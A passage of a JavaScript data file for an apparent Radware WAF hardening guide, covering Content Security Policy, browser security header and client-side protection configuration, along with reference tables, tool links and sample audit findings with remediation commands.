                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">enforcement-mode</span> <span class="code-value">enforce</span></div>
                    <div class="code-comment"># Configure CSP directives</div>
                    <div><span class="code-command">directives</span></div>
                    <div><span class="code-param">default-src</span> <span class="code-value">'self'</span></div>
                    <div><span class="code-param">script-src</span> <span class="code-value">'self' 'nonce- $ {RANDOM}' https://cdn.trusted-scripts.com</span></div>
                    <div><span class="code-param">style-src</span> <span class="code-value">'self' https://cdn.trusted-styles.com</span></div>
                    <div><span class="code-param">img-src</span> <span class="code-value">'self' https://cdn.trusted-images.com data:</span></div>
                    <div><span class="code-param">connect-src</span> <span class="code-value">'self' https://api.example.com</span></div>
                    <div><span class="code-param">font-src</span> <span class="code-value">'self' https://fonts.googleapis.com</span></div>
                    <div><span class="code-param">object-src</span> <span class="code-value">'none'</span></div>
                    <div><span class="code-param">media-src</span> <span class="code-value">'self'</span></div>
                    <div><span class="code-param">frame-src</span> <span class="code-value">'self' https://trusted-frames.com</span></div>
                    <div><span class="code-param">frame-ancestors</span> <span class="code-value">'self'</span></div>
                    <div><span class="code-param">form-action</span> <span class="code-value">'self'</span></div>
                    <div><span class="code-param">base-uri</span> <span class="code-value">'self'</span></div>
                    <div><span class="code-param">sandbox</span> <span class="code-value">allow-forms allow-scripts allow-same-origin</span></div>
                    <div><span class="code-param">report-uri</span> <span class="code-value">https://example.com/csp-report</span></div>
                    <div class="code-comment"># Configure URL patterns</div>
                    <div><span class="code-command">url-patterns</span></div>
                    <div><span class="code-command">pattern</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"admin-area"</span></div>
                    <div><span class="code-command">pattern</span> <span class="code-value">"admin-area"</span></div>
                    <div><span class="code-param">url-match</span> <span class="code-value">"/admin/*"</span></div>
                    <div><span class="code-param">script-src</span> <span class="code-value">'self'</span></div>
                    <div><span class="code-param">object-src</span> <span class="code-value">'none'</span></div>
                    <div><span class="code-param">frame-ancestors</span> <span class="code-value">'none'</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Configure nonce management</div>
                    <div><span class="code-command">nonce-management</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">nonce-length</span> <span class="code-value">16</span></div>
                    <div><span class="code-param">nonce-lifetime</span> <span class="code-value">3600</span></div>
                    <div><span class="code-param">auto-inject-nonces</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure reporting</div>
                    <div><span class="code-command">reporting</span></div>
                    <div><span class="code-param">collect-reports</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">log-violations</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">sampling-rate</span> <span class="code-value">100</span></div>
                    <div><span class="code-param">alert-on-violations</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">CSP Directive Reference</h5>
                <p class="mb-4 text-gray-700">Key Content Security Policy directives and their security implications:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Directive</th>
                            <th class="p-3 border bg-gray-100">Purpose</th>
                            <th class="p-3 border bg-gray-100">Example Value</th>
                            <th class="p-3 border bg-gray-100">Security Impact</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">default-src</td>
                            <td class="p-3 border">Default fallback for other fetch directives</td>
                            <td class="p-3 border">'self'</td>
                            <td class="p-3 border">Sets baseline protection for all resource types</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">script-src</td>
                            <td class="p-3 border">Controls JavaScript sources</td>
                            <td class="p-3 border">'self' https://trusted.com</td>
                            <td class="p-3 border">Critical for XSS prevention</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">style-src</td>
                            <td class="p-3 border">Controls CSS sources</td>
                            <td class="p-3 border">'self' https://styles.com</td>
                            <td class="p-3 border">Prevents CSS-based attacks and CSS injection</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">object-src</td>
                            <td class="p-3 border">Controls plugins like Flash, PDF</td>
                            <td class="p-3 border">'none'</td>
                            <td class="p-3 border">Critical for preventing object-based attacks</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">frame-ancestors</td>
                            <td class="p-3 border">Controls who can embed your site</td>
                            <td class="p-3 border">'self'</td>
                            <td class="p-3 border">Critical for clickjacking prevention</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">base-uri</td>
                            <td class="p-3 border">Restricts &lt;base&gt; tag URLs</td>
                            <td class="p-3 border">'self'</td>
                            <td class="p-3 border">Prevents base tag hijacking attacks</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">form-action</td>
                            <td class="p-3 border">Restricts form submission targets</td>
                            <td class="p-3 border">'self'</td>
                            <td class="p-3 border">Important for CSRF protection</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">upgrade-insecure-requests</td>
                            <td class="p-3 border">Upgrades HTTP to HTTPS</td>
                            <td class="p-3 border">''</td>
                            <td class="p-3 border">Prevents mixed content issues</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">CSP Source Values and Their Security</h5>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Source Value</th>
                            <th class="p-3 border bg-gray-100">Description</th>
                            <th class="p-3 border bg-gray-100">Security Level</th>
                            <th class="p-3 border bg-gray-100">When to Use</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">'none'</td>
                            <td class="p-3 border">Blocks all content of this type</td>
                            <td class="p-3 border">Highest</td>
                            <td class="p-3 border">When resources of this type aren't needed</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">'self'</td>
                            <td class="p-3 border">Allows content from the same origin</td>
                            <td class="p-3 border">High</td>
                            <td class="p-3 border">For most resources that come from your domain</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">https://example.com</td>
                            <td class="p-3 border">Allows content from specific domain</td>
                            <td class="p-3 border">Medium-High</td>
                            <td class="p-3 border">For trusted external resources</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">'nonce-random123'</td>
                            <td class="p-3 border">Allows content with matching nonce</td>
                            <td class="p-3 border">High</td>
                            <td class="p-3 border">For inline scripts that must be allowed</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">'sha256-hash'</td>
                            <td class="p-3 border">Allows content with matching hash</td>
                            <td class="p-3 border">High</td>
                            <td class="p-3 border">For static inline scripts/styles</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">'unsafe-inline'</td>
                            <td class="p-3 border">Allows inline scripts/styles</td>
                            <td class="p-3 border">Low</td>
                            <td class="p-3 border">Avoid if possible; use nonce/hash instead</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">'unsafe-eval'</td>
                            <td class="p-3 border">Allows dynamic code evaluation</td>
                            <td class="p-3 border">Low</td>
                            <td class="p-3 border">Only when absolutely necessary (legacy apps)</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">CSP Implementation Best Practices</h5>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Start with Report-Only Mode:</strong> Use Content-Security-Policy-Report-Only header initially</li>
                    <li class="mb-2"><strong>Incremental Implementation:</strong> Begin with basic directives, then tighten progressively</li>
                    <li class="mb-2"><strong>Source Whitelisting:</strong> Explicitly whitelist trusted sources rather than broad patterns</li>
                    <li class="mb-2"><strong>Avoid Unsafe Directives:</strong> Minimize or eliminate 'unsafe-inline' and 'unsafe-eval'</li>
                    <li class="mb-2"><strong>Use Nonces or Hashes:</strong> For inline scripts that cannot be externalized</li>
                    <li class="mb-2"><strong>Set Strong Defaults:</strong> Use restrictive default-src as fallback for unspecified directives</li>
                    <li class="mb-2"><strong>Monitor Violations:</strong> Collect and analyze CSP violation reports</li>
                    <li class="mb-2"><strong>Context-Specific Policies:</strong> Apply stricter policies to sensitive areas</li>
                    <li class="mb-2"><strong>Test Thoroughly:</strong> Verify functionality across browsers and application features</li>
                    <li class="mb-2"><strong>Maintain and Update:</strong> Regularly review and tighten CSP as application evolves</li>
                </ul>
            `
        },
        {
            title: 'Browser Security Headers Configuration',
            content: `
                <p class="mb-4 text-gray-700">Configure Radware WAF to implement comprehensive browser security headers for enhanced client-side protection.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure browser security headers</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">client-side-protection</span></div>
                    <div><span class="code-command">security-headers</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure individual headers</div>
                    <div><span class="code-command">x-content-type-options</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">value</span> <span class="code-value">nosniff</span></div>
                    <div><span class="code-command">strict-transport-security</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">max-age</span> <span class="code-value">31536000</span></div>
                    <div><span class="code-param">include-subdomains</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">preload</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">x-frame-options</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">value</span> <span class="code-value">SAMEORIGIN</span></div>
                    <div><span class="code-command">x-xss-protection</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">value</span> <span class="code-value">1; mode=block</span></div>
                    <div><span class="code-command">referrer-policy</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">value</span> <span class="code-value">strict-origin-when-cross-origin</span></div>
                    <div><span class="code-command">permissions-policy</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">value</span> <span class="code-value">geolocation=(), camera=(), microphone=(), payment=()</span></div>
                    <div><span class="code-command">cache-control</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">default-value</span> <span class="code-value">no-store, no-cache, must-revalidate, private</span></div>
                    <div><span class="code-command">clear-site-data</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">logout-urls</span> <span class="code-value">"/logout,/sign-out"</span></div>
                    <div><span class="code-param">value</span> <span class="code-value">"cache", "cookies", "storage"</span></div>
                    <div><span class="code-command">cross-origin-opener-policy</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">value</span> <span class="code-value">same-origin</span></div>
                    <div class="code-comment"># Configure URL-specific header overrides</div>
                    <div><span class="code-command">url-patterns</span></div>
                    <div><span class="code-command">pattern</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"static-content"</span></div>
                    <div><span class="code-command">pattern</span> <span class="code-value">"static-content"</span></div>
                    <div><span class="code-param">url-match</span> <span class="code-value">"/static/*,/images/*,/css/*,/js/*"</span></div>
                    <div><span class="code-param">cache-control</span> <span class="code-value">public, max-age=31536000, immutable</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Security Headers and Their Functions</h5>
                <p class="mb-4 text-gray-700">Comprehensive overview of browser security headers and their protective capabilities:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Header</th>
                            <th class="p-3 border bg-gray-100">Primary Protection</th>
                            <th class="p-3 border bg-gray-100">Example Value</th>
                            <th class="p-3 border bg-gray-100">Security Impact</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Content-Security-Policy</td>
                            <td class="p-3 border">XSS, data injection, clickjacking</td>
                            <td class="p-3 border">default-src 'self'</td>
                            <td class="p-3 border">Very High - Most powerful client-side defense</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Strict-Transport-Security</td>
                            <td class="p-3 border">SSL/TLS downgrade, MITM attacks</td>
                            <td class="p-3 border">max-age=31536000; includeSubDomains</td>
                            <td class="p-3 border">High - Enforces HTTPS, prevents protocol downgrade</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">X-Content-Type-Options</td>
                            <td class="p-3 border">MIME type confusion, content sniffing</td>
                            <td class="p-3 border">nosniff</td>
                            <td class="p-3 border">Medium - Prevents MIME-type confusion attacks</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">X-Frame-Options</td>
                            <td class="p-3 border">Clickjacking</td>
                            <td class="p-3 border">SAMEORIGIN</td>
                            <td class="p-3 border">Medium - Legacy clickjacking protection</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">X-XSS-Protection</td>
                            <td class="p-3 border">Reflected XSS</td>
                            <td class="p-3 border">1; mode=block</td>
                            <td class="p-3 border">Low - Legacy browser XSS filter control</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Referrer-Policy</td>
                            <td class="p-3 border">Information leakage via Referer</td>
                            <td class="p-3 border">strict-origin-when-cross-origin</td>
                            <td class="p-3 border">Medium - Controls information in referrer headers</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Permissions-Policy</td>
                            <td class="p-3 border">Browser feature abuse</td>
                            <td class="p-3 border">geolocation=(), camera=()</td>
                            <td class="p-3 border">Medium - Restricts browser feature usage</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Cache-Control</td>
                            <td class="p-3 border">Cached sensitive data</td>
                            <td class="p-3 border">no-store, no-cache</td>
                            <td class="p-3 border">Medium - Prevents caching of sensitive data</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Clear-Site-Data</td>
                            <td class="p-3 border">Persistent client-side data</td>
                            <td class="p-3 border">"cache", "cookies", "storage"</td>
                            <td class="p-3 border">Medium - Clears client-side data during logout</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Cross-Origin-Opener-Policy</td>
                            <td class="p-3 border">Window reference attacks</td>
                            <td class="p-3 border">same-origin</td>
                            <td class="p-3 border">Medium - Isolates browsing contexts</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Cross-Origin-Resource-Policy</td>
                            <td class="p-3 border">Cross-origin information leaks</td>
                            <td class="p-3 border">same-origin</td>
                            <td class="p-3 border">Medium - Prevents cross-origin resource loading</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Cross-Origin-Embedder-Policy</td>
                            <td class="p-3 border">Cross-origin resource sharing</td>
                            <td class="p-3 border">require-corp</td>
                            <td class="p-3 border">Medium - Controls cross-origin embedding</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Referrer-Policy Values Comparison</h5>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Value</th>
                            <th class="p-3 border bg-gray-100">Same-Origin Requests</th>
                            <th class="p-3 border bg-gray-100">Cross-Origin Requests</th>
                            <th class="p-3 border bg-gray-100">Privacy Level</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">no-referrer</td>
                            <td class="p-3 border">No referrer sent</td>
                            <td class="p-3 border">No referrer sent</td>
                            <td class="p-3 border">Highest</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">no-referrer-when-downgrade</td>
                            <td class="p-3 border">Full URL</td>
                            <td class="p-3 border">Full URL (if HTTPS â HTTPS)</td>
                            <td class="p-3 border">Low</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">origin</td>
                            <td class="p-3 border">Origin only</td>
                            <td class="p-3 border">Origin only</td>
                            <td class="p-3 border">Medium</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">origin-when-cross-origin</td>
                            <td class="p-3 border">Full URL</td>
                            <td class="p-3 border">Origin only</td>
                            <td class="p-3 border">Medium</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">same-origin</td>
                            <td class="p-3 border">Full URL</td>
                            <td class="p-3 border">No referrer sent</td>
                            <td class="p-3 border">High</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">strict-origin</td>
                            <td class="p-3 border">Origin only</td>
                            <td class="p-3 border">Origin only (if HTTPS â HTTPS)</td>
                            <td class="p-3 border">Medium-High</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">strict-origin-when-cross-origin</td>
                            <td class="p-3 border">Full URL</td>
                            <td class="p-3 border">Origin only (if HTTPS â HTTPS)</td>
                            <td class="p-3 border">Medium-High</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">unsafe-url</td>
                            <td class="p-3 border">Full URL</td>
                            <td class="p-3 border">Full URL</td>
                            <td class="p-3 border">Lowest</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Security Headers Implementation Best Practices</h5>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Implement All Critical Headers:</strong> Deploy a comprehensive set of security headers</li>
                    <li class="mb-2"><strong>Content-Type-Specific Headers:</strong> Adjust headers based on content type (HTML, JSON, etc.)</li>
                    <li class="mb-2"><strong>URL-Specific Configuration:</strong> Apply different header policies based on URL patterns</li>
                    <li class="mb-2"><strong>Strict HSTS Implementation:</strong> Include subdomains and use long max-age for HSTS</li>
                    <li class="mb-2"><strong>Cache Control Strategy:</strong> Prevent caching of sensitive data, enable caching for static content</li>
                    <li class="mb-2"><strong>Incremental Implementation:</strong> Roll out strict headers gradually to detect issues</li>
                    <li class="mb-2"><strong>Monitor Header Effectiveness:</strong> Track security benefits and potential issues</li>
                    <li class="mb-2"><strong>Header Consistency:</strong> Ensure consistency across different application components</li>
                    <li class="mb-2"><strong>Headers for Authentication Flows:</strong> Apply special attention to login/logout processes</li>
                    <li class="mb-2"><strong>Regular Updates:</strong> Keep header implementations aligned with browser developments</li>
                </ul>
            `
        },
        {
            title: 'Advanced Client-Side Attack Protection',
            content: `
                <p class="mb-4 text-gray-700">Configure Radware WAF to implement protection against sophisticated client-side attacks and emerging threats.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure advanced client-side protections</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">client-side-protection</span></div>
                    <div><span class="code-command">advanced-protections</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure DOM protection</div>
                    <div><span class="code-command">dom-protection</span></div>
                    <div><span class="code-param">dom-clobbering-protection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">dom-based-xss-protection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">client-side-validation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">sensitive-dom-access-monitoring</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure template protection</div>
                    <div><span class="code-command">template-protection</span></div>
                    <div><span class="code-param">client-template-injection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">angular-template-protection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">vue-template-protection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">react-jsx-protection</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure third-party protection</div>
                    <div><span class="code-command">third-party-protection</span></div>
                    <div><span class="code-param">script-integrity-validation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">library-vulnerability-detection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">external-script-monitoring</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">allowed-cdn-sources</span> <span class="code-value">"cdn.jsdelivr.net,unpkg.com,cdnjs.cloudflare.com"</span></div>
                    <div><span class="code-param">script-behavior-analysis</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure postMessage security</div>
                    <div><span class="code-command">postmessage-security</span></div>
                    <div><span class="code-param">origin-validation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">allowed-origins</span> <span class="code-value">"trusted-site.com,partner-api.com"</span></div>
                    <div><span class="code-param">message-sanitization</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure data exfiltration prevention</div>
                    <div><span class="code-command">exfiltration-prevention</span></div>
                    <div><span class="code-param">sensitive-data-monitoring</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">outbound-request-validation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">websocket-security</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">allowed-data-destinations</span> <span class="code-value">"api.example.com,metrics.example.com"</span></div>
                    <div class="code-comment"># Configure CSS protection</div>
                    <div><span class="code-command">css-protection</span></div>
                    <div><span class="code-param">css-exfiltration-protection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">stylesheet-restrictions</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">css-injection-protection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Advanced Client-Side Attack Vectors</h5>
                <p class="mb-4 text-gray-700">Sophisticated client-side attack techniques and their mitigation strategies:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Attack Vector</th>
                            <th class="p-3 border bg-gray-100">Description</th>
                            <th class="p-3 border bg-gray-100">Impact</th>
                            <th class="p-3 border bg-gray-100">Protection Strategies</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">DOM Clobbering</td>
                            <td class="p-3 border">Abusing HTML elements to override JavaScript properties</td>
                            <td class="p-3 border">Bypassing XSS filters, JavaScript logic manipulation</td>
                            <td class="p-3 border">Property freezing, namespace isolation, CSP, strict property checking</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Client-Side Template Injection</td>
                            <td class="p-3 border">Injecting template syntax into frameworks (Angular, Vue, etc.)</td>
                            <td class="p-3 border">JavaScript execution, data theft, application control</td>
                            <td class="p-3 border">Template sanitization, avoiding dynamic templates, CSP</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Prototype Pollution</td>
                            <td class="p-3 border">Manipulation of JavaScript object prototypes</td>
                            <td class="p-3 border">Logic manipulation, bypassing security checks</td>
                            <td class="p-3 border">Object.freeze, input validation, avoiding unsafe merges</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">CSS Exfiltration</td>
                            <td class="p-3 border">Using CSS selectors to extract data from page</td>
                            <td class="p-3 border">Data theft, session hijacking</td>
                            <td class="p-3 border">CSP style-src restrictions, sanitizing dynamic styles</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">postMessage Abuse</td>
                            <td class="p-3 border">Exploiting cross-origin messaging without validation</td>
                            <td class="p-3 border">Data theft, DOM manipulation, XSS</td>
                            <td class="p-3 border">Origin validation, message sanitization, secure event handling</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Subresource Integrity Bypass</td>
                            <td class="p-3 border">Compromised third-party resources without integrity checks</td>
                            <td class="p-3 border">Supply chain attacks, script injection</td>
                            <td class="p-3 border">SRI attributes, CSP, script fingerprinting</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Browser Extension Exploitation</td>
                            <td class="p-3 border">Targeting vulnerabilities in browser extensions</td>
                            <td class="p-3 border">Privilege escalation, data theft</td>
                            <td class="p-3 border">CSP, isolation techniques, defense-in-depth</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Shadow DOM Attacks</td>
                            <td class="p-3 border">Exploiting web components and shadow DOM encapsulation</td>
                            <td class="p-3 border">UI spoofing, content injection</td>
                            <td class="p-3 border">Shadow DOM best practices, CSP, trusted types</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Subresource Integrity Implementation</h5>
                <p class="mb-4 text-gray-700">Ensuring the integrity of third-party resources:</p>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Hash Generation:</strong> Generate cryptographic hashes (SHA-384 recommended) for external resources</li>
                    <li class="mb-2"><strong>Attribute Implementation:</strong> Add integrity attributes to script and link tags</li>
                    <li class="mb-2"><strong>Multiple Hashes:</strong> Support multiple hash algorithms for broader compatibility</li>
                    <li class="mb-2"><strong>CDN Selection:</strong> Use reputable CDNs with version pinning and HTTPS</li>
                    <li class="mb-2"><strong>Fall-back Strategy:</strong> Implement contingency for integrity failures</li>
                    <li class="mb-2"><strong>Resource Monitoring:</strong> Regularly check for changes in third-party resources</li>
                    <li class="mb-2"><strong>Combine with CSP:</strong> Use with CSP for defense-in-depth</li>
                    <li class="mb-2"><strong>Automate Updates:</strong> Implement automated process for updating hashes when resources change</li>
                </ul>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Client-Side Security Best Practices</h5>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Defense in Depth:</strong> Implement multiple layers of client-side protection</li>
                    <li class="mb-2"><strong>Content Security Policy:</strong> Implement strict CSP as foundation of client-side security</li>
                    <li class="mb-2"><strong>Input Sanitization:</strong> Properly validate and sanitize all input before processing</li>
                    <li class="mb-2"><strong>Output Encoding:</strong> Context-appropriate encoding of data for various HTML contexts</li>
                    <li class="mb-2"><strong>Minimize Attack Surface:</strong> Limit external dependencies and client-side complexity</li>
                    <li class="mb-2"><strong>Library Management:</strong> Keep client-side libraries updated, verify integrity</li>
                    <li class="mb-2"><strong>JavaScript Security:</strong> Avoid eval(), document.write(), and other dangerous functions</li>
                    <li class="mb-2"><strong>Iframe Sandbox:</strong> Use sandbox attribute for untrusted content in iframes</li>
                    <li class="mb-2"><strong>CORS Configuration:</strong> Implement strict cross-origin resource sharing policies</li>
                    <li class="mb-2"><strong>Client-Side Monitoring:</strong> Implement runtime monitoring for suspicious behaviors</li>
                </ul>
            `
        }
    ],
    tools: [
        {
            title: 'XSS Protection Analyzer',
            icon: 'fa-code',
            description: 'Advanced tool for detecting and analyzing XSS vulnerabilities in web applications.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'XSS Protection'
        },
        {
            title: 'CSRF Defense Validator',
            icon: 'fa-random',
            description: 'Tool for validating and testing CSRF protection mechanisms.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'CSRF Defense'
        },
        {
            title: 'Content Security Policy Generator',
            icon: 'fa-shield-check',
            description: 'Automated tool for creating and testing Content Security Policies.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'CSP Generator'
        },
        {
            title: 'Security Headers Analyzer',
            icon: 'fa-heading',
            description: 'Tool for analyzing and optimizing browser security headers implementation.',
            link: 'https://securityheaders.com/',
            linkText: 'Security Headers'
        },
        {
            title: 'Clickjacking Tester',
            icon: 'fa-window-restore',
            description: 'Tool for testing protection against UI redressing and clickjacking attacks.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Clickjacking Protection'
        },
        {
            title: 'Cookie Security Inspector',
            icon: 'fa-cookie',
            description: 'Analysis tool for evaluating cookie security configurations.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Cookie Security'
        },
        {
            title: 'DOM Security Analyzer',
            icon: 'fa-sitemap',
            description: 'Tool for detecting DOM-based vulnerabilities and client-side injection flaws.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'DOM Security'
        },
        {
            title: 'Third-Party Script Validator',
            icon: 'fa-plug',
            description: 'Tool for validating and monitoring third-party JavaScript resources.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Script Validation'
        }
    ]
}









    ],
    
    // Sample findings data for demonstration
    findings: [
        {
            id: 'finding-001',
            category: 'deployment',
            title: 'Missing Access Controls for Management Interface',
            severity: 'high',
            description: 'The AppWall management interface is not properly secured with IP-based access controls, allowing connections from any source IP address. This increases the risk of unauthorized access to the WAF administration interface.',
            remediation: 'Implement IP-based access controls to restrict management access to authorized administration networks only. Ensure management access is only available over encrypted channels (HTTPS/SSH).',
            config: `# Restrict management access to specific networks
configure terminal
system administration
ssh allowed-networks 10.0.0.0/24 192.168.10.0/24
gui allowed-networks 10.0.0.0/24 192.168.10.0/24
commit
exit`
        },
        {
            id: 'finding-002',
            category: 'signatures',
            title: 'Outdated Attack Signatures',
            severity: 'medium',
            description: 'The AppWall is using outdated attack signatures that do not protect against recent vulnerabilities. Attack signature updates have not been applied for more than 30 days.',
            remediation: 'Update attack signatures to the latest version and configure automatic signature updates to occur at least weekly.',
            config: `# Configure automatic signature updates
configure terminal
appwall
signatures auto-update enable
signatures update-schedule daily
signatures update-time 01:00
commit
exit`
        },
        {
            id: 'finding-003',
            category: 'signatures',
            title: 'Excessive Signature Exceptions',
            severity: 'medium',
            description: 'Multiple global signature exceptions have been configured, potentially allowing malicious requests that would otherwise be blocked.',
            remediation: 'Review all signature exceptions and remove any unnecessary exclusions. Configure more specific, targeted exceptions where required instead of broad exclusions.',
            config: `# Review and remove excessive signature exceptions
configure terminal
appwall
policy "Web-Portal"
signatures show-exceptions
signatures remove-exception id 12345
commit
exit`
        },
        {
            id: 'finding-004',
            category: 'threat-protection',
            title: 'Bot Protection Not Enabled',
            severity: 'low',
            description: 'Advanced bot detection features are available but not enabled. The application may be vulnerable to scraping, credential stuffing, and other automated attacks.',
            remediation: 'Enable bot protection features with appropriate settings based on application requirements.',
            config: `# Enable bot protection
configure terminal
appwall
policy "Web-Portal"
bot-protection
state enable
detection-level medium
captcha-protection enable
rate-limiting enable
commit
exit`
        }
    ],
    
    // Reference data for attacks and protections
    attackTypes: {
        'sql-injection': {
            name: 'SQL Injection',
